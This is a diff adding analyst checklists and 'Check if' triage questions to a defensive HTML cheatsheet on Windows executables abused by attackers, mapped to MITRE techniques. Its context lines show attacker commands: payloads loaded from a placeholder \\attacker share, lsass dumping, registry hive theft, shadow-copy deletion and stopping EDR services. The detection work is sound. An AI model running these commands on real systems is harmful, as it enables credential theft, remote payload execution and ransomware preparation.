@@ -76,10 +76,30 @@
     .ql-table td:first-child { color:var(--accent); white-space:nowrap; }
     .ql-table tr:hover td { background:rgba(0,255,159,.03); }
 
+    /* ── Check If section ── */
+    .check-if-section .tool-section__label { color:#fb923c; }
+    .check-if-section ul li { font-size:.82rem; color:var(--text); }
+    .check-if-section ul li::marker { color:#fb923c; }
+
+    /* ── Analyst Panel ── */
+    .analyst-panel { position:fixed; right:0; top:60px; width:260px; height:calc(100vh - 60px); background:var(--bg-card); border-left:1px solid var(--border); z-index:80; display:flex; flex-direction:column; overflow:hidden; transition:width .2s; box-shadow:-2px 0 12px rgba(0,0,0,.3); }
+    .analyst-panel.collapsed { width:36px; }
+    .analyst-panel__header { padding:.6rem .75rem; border-bottom:1px solid var(--border); display:flex; align-items:center; justify-content:space-between; gap:.5rem; flex-shrink:0; min-height:42px; }
+    .analyst-panel__title { font-family:var(--font-mono); font-size:.72rem; color:var(--accent); white-space:nowrap; overflow:hidden; }
+    .analyst-panel__toggle { background:transparent; border:1px solid var(--border); color:var(--text-muted); font-family:var(--font-mono); font-size:.8rem; width:22px; height:22px; border-radius:4px; cursor:pointer; flex-shrink:0; display:flex; align-items:center; justify-content:center; }
+    .analyst-panel__toggle:hover { border-color:var(--accent); color:var(--accent); }
+    .analyst-panel__body { flex:1; overflow-y:auto; padding:.75rem; display:flex; flex-direction:column; gap:.9rem; }
+    .analyst-panel.collapsed .analyst-panel__body,
+    .analyst-panel.collapsed .analyst-panel__title { display:none; }
+    .panel-section__label { font-family:var(--font-mono); font-size:.65rem; text-transform:uppercase; letter-spacing:.1em; color:var(--accent); margin-bottom:.3rem; }
+    .panel-section ul { margin:0; padding-left:1rem; display:flex; flex-direction:column; gap:.2rem; }
+    .panel-section ul li { font-size:.74rem; color:var(--text-muted); line-height:1.45; }
+
     /* ── No results ── */
     .cs-empty { display:none; text-align:center; padding:4rem 2rem; color:var(--text-muted); font-family:var(--font-mono); grid-column:1/-1; }
     .cs-empty.show { display:block; }
 
+    @media(max-width:1200px) { .analyst-panel { display:none; } }
     @media(max-width:768px) {
       .cs-grid { grid-template-columns:1fr; padding:1rem; }
       .cs-controls { flex-direction:column; align-items:flex-start; }
@@ -100,6 +120,71 @@
       </ul>
     </div>
   </nav>
+
+  <!-- ══ Analyst Checklist Panel ══ -->
+  <div class="analyst-panel" id="analystPanel">
+    <div class="analyst-panel__header">
+      <span class="analyst-panel__title">&gt; Analyst Checklist</span>
+      <button class="analyst-panel__toggle" id="panelToggle" title="Collapse panel">−</button>
+    </div>
+    <div class="analyst-panel__body" id="panelBody">
+      <div class="panel-section">
+        <div class="panel-section__label">What</div>
+        <ul>
+          <li>What is the process doing?</li>
+          <li>What command line was used?</li>
+          <li>What files were created or accessed?</li>
+          <li>What network connections were made?</li>
+          <li>What child processes were spawned?</li>
+        </ul>
+      </div>
+      <div class="panel-section">
+        <div class="panel-section__label">Where</div>
+        <ul>
+          <li>Where is the binary located on disk?</li>
+          <li>Where are output/drop files written?</li>
+          <li>Where is the network destination (IP/domain)?</li>
+          <li>Where did this run — workstation, server, or DC?</li>
+        </ul>
+      </div>
+      <div class="panel-section">
+        <div class="panel-section__label">Who</div>
+        <ul>
+          <li>What user account executed it?</li>
+          <li>Is it SYSTEM, a service account, or a user?</li>
+          <li>Is this user expected to run this tool?</li>
+          <li>What is the parent process (spawned by whom)?</li>
+        </ul>
+      </div>
+      <div class="panel-section">
+        <div class="panel-section__label">Why</div>
+        <ul>
+          <li>Is there a business justification?</li>
+          <li>Does it align with the user's role?</li>
+          <li>Is this tool expected in this environment?</li>
+          <li>What happened immediately before and after?</li>
+        </ul>
+      </div>
+      <div class="panel-section">
+        <div class="panel-section__label">When</div>
+        <ul>
+          <li>What time did this occur?</li>
+          <li>Is it off-hours, weekend, or a holiday?</li>
+          <li>What else happened at the same timestamp?</li>
+          <li>Is this the first time this process has run?</li>
+        </ul>
+      </div>
+      <div class="panel-section">
+        <div class="panel-section__label">How</div>
+        <ul>
+          <li>What technique or TTP is being used?</li>
+          <li>Was this interactive or automated/scripted?</li>
+          <li>Was persistence established?</li>
+          <li>What is the full attack chain so far?</li>
+        </ul>
+      </div>
+    </div>
+  </div>
 
   <div class="cs-hero">
     <h1><span class="accent">&gt;</span> IR Cheatsheet — Abused Executables</h1>
@@ -223,6 +308,16 @@ VirtualProtect     Marshal::Copy     amsi.dll
           </ul>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is -enc or -EncodedCommand present with a large Base64 blob?</li>
+          <li>What is the parent — Office app, browser, mshta, or wmiprvse?</li>
+          <li>Does the command contain IEX, DownloadString, or a remote URL?</li>
+          <li>Is -Version 2 present? (AMSI bypass via downgrade)</li>
+          <li>Does Event 4104 show amsiInitFailed or AmsiScanBuffer strings?</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1059/001/" target="_blank">T1059.001</a></span>
         <span class="sev sev--critical">Critical</span>
@@ -253,6 +348,15 @@ VirtualProtect     Marshal::Copy     amsi.dll
             <span class="rflag">&amp;&amp; chained recon commands</span>
           </div>
         </div>
+      </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>What is the parent — is it an Office app, browser, or scheduler?</li>
+          <li>What child process did it spawn — powershell, mshta, or rundll32?</li>
+          <li>Are multiple && chained recon commands visible?</li>
+          <li>Is it running from %TEMP% or %APPDATA%?</li>
+        </ul>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1059/003/" target="_blank">T1059.003</a></span>
@@ -292,6 +396,15 @@ rundll32 javascript:"..\\mshtml,RunHTMLApplication"</div>
             <span class="rflag">Network connections from process</span>
           </div>
         </div>
+      </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>What DLL is being loaded and where is it located on disk?</li>
+          <li>Is comsvcs.dll + MiniDump present? (LSASS dump — treat as credential theft)</li>
+          <li>Is there a UNC path (\\) in the arguments? (remote DLL load)</li>
+          <li>Did the process make any outbound network connections?</li>
+        </ul>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1218/011/" target="_blank">T1218.011</a></span>
@@ -397,6 +510,16 @@ mshta → bitsadmin     mshta → schtasks    mshta → reg.exe</div>
           </ul>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is there a URL or vbscript:/javascript: moniker in the arguments?</li>
+          <li>What is the parent — Office app, browser, or explorer? (explorer = ClickFix lure)</li>
+          <li>Did it spawn powershell, cmd, rundll32, or any other LOLBin?</li>
+          <li>Did the user report a website asking them to open Run and paste a command?</li>
+          <li>Does Sysmon EID 7 show jscript.dll or vbscript.dll loaded?</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1218/005/" target="_blank">T1218.005</a></span>
         <span class="sev sev--critical">Critical</span>
@@ -429,6 +552,15 @@ mshta → bitsadmin     mshta → schtasks    mshta → reg.exe</div>
             <span class="rflag">//B silent mode</span>
           </div>
         </div>
+      </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>What script is it running and where is the file located?</li>
+          <li>Is the script name random or gibberish (aB3x.vbs)?</li>
+          <li>What is the parent process — is it an Office app?</li>
+          <li>Does the script content contain obfuscated strings or Chr() calls?</li>
+        </ul>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1059/005/" target="_blank">T1059.005</a> / <a href="https://attack.mitre.org/techniques/T1059/007/" target="_blank">T1059.007</a></span>
@@ -465,6 +597,15 @@ regsvr32 /s /u /i:\\attacker\share\p.sct scrobj.dll</div>
             <span class="rflag">Outbound HTTP from regsvr32</span>
           </div>
         </div>
+      </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is there a URL in the /i: argument?</li>
+          <li>Is scrobj.dll present in the command line?</li>
+          <li>Did it make outbound HTTP connections (Sysmon EID 3)?</li>
+          <li>Is it running outside of any software installation context?</li>
+        </ul>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1218/010/" target="_blank">T1218.010</a></span>
@@ -503,6 +644,14 @@ msiexec /q /i \\attacker\share\payload.msi</div>
           </div>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is the /i argument a URL rather than a local .msi path?</li>
+          <li>Is the MSI file in %TEMP% or C:\Users\Public?</li>
+          <li>What child processes were spawned after installation?</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1218/007/" target="_blank">T1218.007</a></span>
         <span class="sev sev--high">High</span>
@@ -539,6 +688,15 @@ msbuild.exe %TEMP%\build.xml</div>
             <span class="rflag">Network connections from process</span>
           </div>
         </div>
+      </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is this running outside a known developer or build pipeline context?</li>
+          <li>Is the .csproj or .xml file in %TEMP% or C:\Users\Public?</li>
+          <li>Is the user a developer? Is there a Visual Studio install?</li>
+          <li>Did it make any outbound network connections?</li>
+        </ul>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1127/001/" target="_blank">T1127.001</a></span>
@@ -578,6 +736,15 @@ wmic shadowcopy delete</div>
           </div>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is /node: targeting a remote host IP or hostname?</li>
+          <li>Is /format: pointing to a URL? (remote XSL execution)</li>
+          <li>Is "process call create" present? (remote code execution)</li>
+          <li>Is "shadowcopy delete" present? (ransomware pre-detonation)</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1047/" target="_blank">T1047</a></span>
         <span class="sev sev--high">High</span>
@@ -613,6 +780,15 @@ certutil -decode encoded.txt payload.exe</div>
             <span class="rflag">Non-PKI admin running it</span>
           </div>
         </div>
+      </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is -urlcache or -split -f downloading from an external URL?</li>
+          <li>Is -decode being used on a file in %TEMP%?</li>
+          <li>What is the output file type — .exe, .dll, .ps1, or .bat?</li>
+          <li>Is this user a PKI/certificate admin? Any legitimate reason to run this?</li>
+        </ul>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1105/" target="_blank">T1105</a> / <a href="https://attack.mitre.org/techniques/T1027/" target="_blank">T1027</a></span>
@@ -650,6 +826,15 @@ schtasks /create /s REMOTEHOST /tn "..." /tr "..."</div>
           </div>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>What binary is in the /tr argument — is it in %TEMP% or a user-writable path?</li>
+          <li>Is /s targeting a remote host? (lateral movement via task)</li>
+          <li>Is /ru SYSTEM combined with a suspicious command?</li>
+          <li>Does the task name mimic a legitimate one (MicrosoftEdgeUpdate)?</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1053/005/" target="_blank">T1053.005</a></span>
         <span class="sev sev--high">High</span>
@@ -685,6 +870,14 @@ sc stop &lt;EDR_service&gt;</div>
             <span class="rflag">Remote target \\HOST</span>
           </div>
         </div>
+      </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>What is the binPath — is it in a user-writable directory?</li>
+          <li>Is it stopping or disabling a security service (MsMpEng, csfalconservice)?</li>
+          <li>Is \\HOST present? (remote service install via PsExec combo)</li>
+        </ul>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1543/003/" target="_blank">T1543.003</a></span>
@@ -723,6 +916,15 @@ reg save HKLM\SYSTEM C:\Users\Public\system.hive</div>
           </div>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is it adding to Run or RunOnce keys? (persistence)</li>
+          <li>Is it saving SAM, SYSTEM, or SECURITY hives? (credential theft)</li>
+          <li>Is it disabling Defender or UAC via registry keys?</li>
+          <li>Are .hive files appearing in user-writable directories?</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1547/001/" target="_blank">T1547.001</a> / <a href="https://attack.mitre.org/techniques/T1003/002/" target="_blank">T1003.002</a></span>
         <span class="sev sev--critical">Critical</span>
@@ -759,6 +961,14 @@ netsh add helper C:\Users\Public\evil.dll</div>
           </div>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is portproxy add tunneling traffic to an external IP?</li>
+          <li>Is advfirewall being set to off? (disabling host firewall)</li>
+          <li>Is add helper loading a non-Microsoft DLL? (persistence mechanism)</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1090/001/" target="_blank">T1090.001</a></span>
         <span class="sev sev--high">High</span>
@@ -794,6 +1004,14 @@ vssadmin resize shadowstorage /maxsize=401MB</div>
             <span class="rflag">Paired with bcdedit + wbadmin</span>
           </div>
         </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is "delete shadows" in the command? Treat as ransomware indicator — escalate immediately.</li>
+          <li>Is it paired with bcdedit and wbadmin? (ransomware pre-detonation trio)</li>
+          <li>Is it being invoked by a non-backup service or unexpected user?</li>
+        </ul>
+      </div>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1490/" target="_blank">T1490</a></span>
@@ -828,6 +1046,14 @@ bcdedit /set {default} bootstatuspolicy ignoreallfailures</div>
             <span class="rflag">Paired with vssadmin + wbadmin</span>
           </div>
         </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is recoveryenabled being set to No? (victims can't repair on reboot)</li>
+          <li>Is bootstatuspolicy ignoreallfailures being set?</li>
+          <li>Is this paired with vssadmin + wbadmin? (ransomware pre-detonation trio)</li>
+        </ul>
+      </div>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1490/" target="_blank">T1490</a></span>
@@ -857,6 +1083,14 @@ bcdedit /set {default} bootstatuspolicy ignoreallfailures</div>
             <span class="rflag">Not from backup software</span>
           </div>
         </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is "delete catalog" in the command? (destroys backup catalog)</li>
+          <li>Is it running simultaneously with vssadmin and bcdedit?</li>
+          <li>Is it being invoked by a non-backup process or unexpected user?</li>
+        </ul>
+      </div>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1490/" target="_blank">T1490</a></span>
@@ -892,6 +1126,15 @@ bcdedit /set {default} bootstatuspolicy ignoreallfailures</div>
             <span class="rflag">Executed before payload deploy</span>
           </div>
         </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>What filter name is being unloaded?</li>
+          <li>Does that filter name belong to an EDR product (CrowdStrike, SentinelOne, Carbon Black)?</li>
+          <li>What process invoked fltMC — is it a known attacker tool?</li>
+          <li>Was this followed immediately by a payload execution?</li>
+        </ul>
+      </div>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1562/001/" target="_blank">T1562.001</a></span>
@@ -928,6 +1171,15 @@ bcdedit /set {default} bootstatuspolicy ignoreallfailures</div>
           </div>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is ntds.dit referenced anywhere in the arguments? (AD credential database)</li>
+          <li>Is it accessing a VSS shadow copy path (GLOBALROOT\Device\HarddiskVolumeShadowCopy)?</li>
+          <li>Where is the output file being written — is it in a user-writable or staging directory?</li>
+          <li>Was reg save SYSTEM hive run nearby? (needed to decrypt ntds.dit)</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1003/003/" target="_blank">T1003.003</a></span>
         <span class="sev sev--critical">Critical</span>
@@ -958,6 +1210,15 @@ bcdedit /set {default} bootstatuspolicy ignoreallfailures</div>
             <span class="rflag">Child of Office / browser</span>
           </div>
         </div>
+      </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is the user a non-IT, non-admin account?</li>
+          <li>Was this preceded by other recon commands (whoami, net, ipconfig)?</li>
+          <li>Is it a child of an Office app or browser?</li>
+          <li>Is /dclist: or /domain_trusts used? (domain enumeration)</li>
+        </ul>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1482/" target="_blank">T1482</a></span>
@@ -994,6 +1255,15 @@ bcdedit /set {default} bootstatuspolicy ignoreallfailures</div>
           </div>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>What is the download URL — is it an external IP or domain?</li>
+          <li>What is the destination path — is it %TEMP%, Public, or a user dir?</li>
+          <li>Is SetNotifyCmdLine present with an executable? (runs code after download)</li>
+          <li>Is this BITS job created by a non-system process?</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1197/" target="_blank">T1197</a></span>
         <span class="sev sev--high">High</span>
@@ -1029,6 +1299,14 @@ bcdedit /set {default} bootstatuspolicy ignoreallfailures</div>
           </div>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Was /list run without a helpdesk or IT ticket justification?</li>
+          <li>What followed it — was runas /savedcred used immediately after?</li>
+          <li>Is this part of a recon or lateral movement chain?</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1555/004/" target="_blank">T1555.004</a></span>
         <span class="sev sev--medium">Medium</span>
@@ -1062,6 +1340,14 @@ bcdedit /set {default} bootstatuspolicy ignoreallfailures</div>
             <span class="rflag">Non-helpdesk context</span>
           </div>
         </div>
+      </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is /start present with an /output path?</li>
+          <li>Is this outside a helpdesk troubleshooting context?</li>
+          <li>Where is the output ZIP saved — is it in a staging or exfil directory?</li>
+        </ul>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1113/" target="_blank">T1113</a></span>
@@ -1097,6 +1383,14 @@ pktmon pcapng pktmon.etl -o capture.pcap</div>
           </div>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is --capture being used? (active sniffing in progress)</li>
+          <li>Where is the .etl or .pcap output being stored?</li>
+          <li>Is this user a network admin with a ticket? Any legitimate reason?</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1040/" target="_blank">T1040</a></span>
         <span class="sev sev--medium">Medium</span>
@@ -1126,6 +1420,15 @@ pktmon pcapng pktmon.etl -o capture.pcap</div>
             <span class="rflag">.inf from %TEMP% / Downloads</span>
           </div>
         </div>
+      </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>What .inf file is in the arguments — where is it located?</li>
+          <li>Did it spawn an elevated child process (UAC bypass)?</li>
+          <li>Was the .inf from %TEMP% or Downloads? (phishing dropper)</li>
+          <li>Any legitimate CMSTP usage is extremely rare — treat all occurrences as suspicious.</li>
+        </ul>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1218/003/" target="_blank">T1218.003</a></span>
@@ -1158,6 +1461,15 @@ pktmon pcapng pktmon.etl -o capture.pcap</div>
           </div>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is this running outside of any software installation workflow?</li>
+          <li>Is the target DLL in %TEMP% or a user-writable path?</li>
+          <li>Is the user a developer? Is .NET/Visual Studio present?</li>
+          <li>Did it spawn cmd or powershell as a child process?</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1218/004/" target="_blank">T1218.004</a></span>
         <span class="sev sev--high">High</span>
@@ -1186,6 +1498,14 @@ pktmon pcapng pktmon.etl -o capture.pcap</div>
             <span class="rflag">Elevated cmd/powershell as child</span>
           </div>
         </div>
+      </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Was HKCU\Software\Classes\mscfile modified before eventvwr ran?</li>
+          <li>Did it spawn an elevated child process (cmd/powershell with admin token)?</li>
+          <li>Is eventvwr.exe running in an unexpected context or time?</li>
+        </ul>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1548/002/" target="_blank">T1548.002</a></span>
@@ -1217,6 +1537,15 @@ pktmon pcapng pktmon.etl -o capture.pcap</div>
             <span class="rflag">Run via batch from %TEMP%</span>
           </div>
         </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is it targeting AV or EDR process names (MsMpEng, csfalconservice, SentinelAgent)?</li>
+          <li>Is it targeting backup or database services (veeam, sqlserver, winbackup)?</li>
+          <li>Are 10+ kills happening in rapid succession — likely a batch kill script?</li>
+          <li>Was it invoked from %TEMP% via a batch file? (ransomware pre-detonation)</li>
+        </ul>
+      </div>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1562/001/" target="_blank">T1562.001</a></span>
@@ -1254,6 +1583,14 @@ exec "cmd.exe /c copy ..."</div>
           </div>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is /s pointing to a script file in a user-writable path?</li>
+          <li>Does the script file contain an exec directive running arbitrary commands?</li>
+          <li>Is this running on a workstation? (diskshadow is a server-only tool)</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1218/" target="_blank">T1218</a> / <a href="https://attack.mitre.org/techniques/T1490/" target="_blank">T1490</a></span>
         <span class="sev sev--high">High</span>
@@ -1289,6 +1626,15 @@ exec "cmd.exe /c copy ..."</div>
           </div>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is PSEXESVC.exe present on remote target hosts?</li>
+          <li>Do Event IDs 7045 + 4697 appear on the target? (remote service install)</li>
+          <li>Is this being run from a non-admin workstation or by a non-IT user?</li>
+          <li>Is it moving laterally — check for execution on multiple hosts in quick succession.</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1569/002/" target="_blank">T1569.002</a></span>
         <span class="sev sev--critical">Critical</span>
@@ -1323,6 +1669,14 @@ procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp</div>
             <span class="rflag">Followed by exfil (WinSCP/Rclone)</span>
           </div>
         </div>
+      </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is lsass.exe the target process? Any dump of lsass = credential theft.</li>
+          <li>Where is the .dmp file being written — is it in a staging or exfil directory?</li>
+          <li>Was it followed by data staging, compression, or exfil activity?</li>
+        </ul>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1003/001/" target="_blank">T1003.001</a></span>
@@ -1360,6 +1714,15 @@ procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp</div>
           </div>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is there a process running with no icon, no version info, or missing PE metadata?</li>
+          <li>Are named pipes like \pipe\MSSE-* or postex_* present? (beacon comms)</li>
+          <li>Is there sleep jitter (irregular intervals) in outbound HTTPS traffic?</li>
+          <li>Do JA3/JA3S hashes match known Cobalt Strike default profiles?</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: Multiple TTPs</span>
         <span class="sev sev--critical">Critical</span>
@@ -1390,6 +1753,15 @@ procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp</div>
             <span class="rflag">SeDebugPrivilege on non-system process</span>
           </div>
         </div>
+      </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Does Sysmon Event 10 show lsass.exe being accessed by an unexpected process?</li>
+          <li>Is Event 4662 + Replication GUID present? (DCSync — no lsass touch needed)</li>
+          <li>Is SeDebugPrivilege being requested on a non-SYSTEM process?</li>
+          <li>Are sekurlsa, lsadump, or privilege::debug strings in the command?</li>
+        </ul>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1003/" target="_blank">T1003</a></span>
@@ -1422,6 +1794,15 @@ procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp</div>
           </div>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is Event 4769 firing in bulk from one account? (Kerberoasting — requesting many TGS tickets)</li>
+          <li>Is Event 4768 showing RC4 encryption type? (forced downgrade for crackability)</li>
+          <li>Is Rubeus.exe present anywhere on disk?</li>
+          <li>Are service ticket requests coming from a non-service account?</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1558/003/" target="_blank">T1558.003</a></span>
         <span class="sev sev--critical">Critical</span>
@@ -1451,6 +1832,15 @@ procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp</div>
             <span class="rflag">*_computers.json / *_users.json artifacts</span>
           </div>
         </div>
+      </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is there an LDAP query storm from a single host in a short window?</li>
+          <li>Are *_computers.json, *_users.json, or *_sessions.json files on disk?</li>
+          <li>Was SharpHound.exe or SharpHound.ps1 found anywhere?</li>
+          <li>Is Event 4662 spiking from an unexpected host?</li>
+        </ul>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1069/" target="_blank">T1069</a> / <a href="https://attack.mitre.org/techniques/T1087/" target="_blank">T1087</a></span>
@@ -1482,6 +1872,15 @@ procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp</div>
             <span class="rflag">ADMIN$ from non-standard hosts</span>
           </div>
         </div>
+      </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is C:\Windows\__output present? (wmiexec artifact — command output file)</li>
+          <li>Was a BTOBTO service created on the target? (smbexec indicator — Event 7045)</li>
+          <li>Are Event 4624 Type 3 logins appearing from unexpected source IPs?</li>
+          <li>Is ADMIN$ being accessed from non-standard management hosts?</li>
+        </ul>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1003/" target="_blank">T1003</a> / <a href="https://attack.mitre.org/techniques/T1047/" target="_blank">T1047</a></span>
@@ -1517,6 +1916,15 @@ lazagne.exe browsers</div>
           </div>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is lazagne.exe present anywhere on the system? (treat as confirmed theft)</li>
+          <li>Have browser credential database files (Login Data, cookies) been accessed in bulk?</li>
+          <li>Is it running with the "all" argument? (full credential sweep across all apps)</li>
+          <li>Is it renamed? Check PE imports for credential access patterns.</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1555/" target="_blank">T1555</a></span>
         <span class="sev sev--critical">Critical</span>
@@ -1551,6 +1959,15 @@ adfind.exe -gcb -sc trustdmp</div>
             <span class="rflag">Often renamed — check PE metadata</span>
           </div>
         </div>
+      </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is this running on a workstation rather than a DC or admin jump box?</li>
+          <li>Was CSV or text AD output created in a staging directory?</li>
+          <li>Is the user a non-IT, non-admin account?</li>
+          <li>Is it renamed? Check PE metadata — AdFind is commonly disguised.</li>
+        </ul>
       </div>
       <div class="tool-card__footer">
